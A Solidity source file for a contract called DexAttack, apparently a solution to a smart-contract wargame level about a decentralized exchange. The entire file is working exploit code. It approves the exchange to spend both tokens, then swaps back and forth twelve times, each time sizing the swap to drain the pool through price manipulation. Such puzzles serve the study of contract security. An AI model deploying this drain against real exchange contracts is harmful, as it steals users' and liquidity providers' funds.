// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "./Dex.sol";

contract DexAttack {
    address dex;
    address token1;
    address token2;

    function attack(address _dex) public {
        dex = _dex;
        token1 = Dex(dex).token1();
        token2 = Dex(dex).token2();

        // Approve all tokens to Dex
        SwappableToken(token1).approve(address(this), dex, 1 << 255);
        SwappableToken(token2).approve(address(this), dex, 1 << 255);

        for (uint256 i = 0; i < 12; i++) {
            swapTokens(i % 2 == 1);
        }
    }

    function min(uint256 a, uint256 b) public pure returns (uint256) {
        if (a < b) {
            return a;
        } else {
            return b;
        }
    }

    function swapTokens(bool swap1to2) internal {
        address tokenA;
        address tokenB;
        if (swap1to2) {
            tokenA = token1;
            tokenB = token2;
        } else {
            tokenA = token2;
            tokenB = token1;
        }
        uint256 swapAmount = getSwapAmount(tokenA, tokenB);
        Dex(dex).swap(tokenA, tokenB, swapAmount);
    }

    function getSwapAmount(
        address from,
        address to
    ) public view returns (uint256) {

        return min(
            IERC20(from).balanceOf(address(this)),
            IERC20(from).balanceOf(address(dex))
        );
    }
}
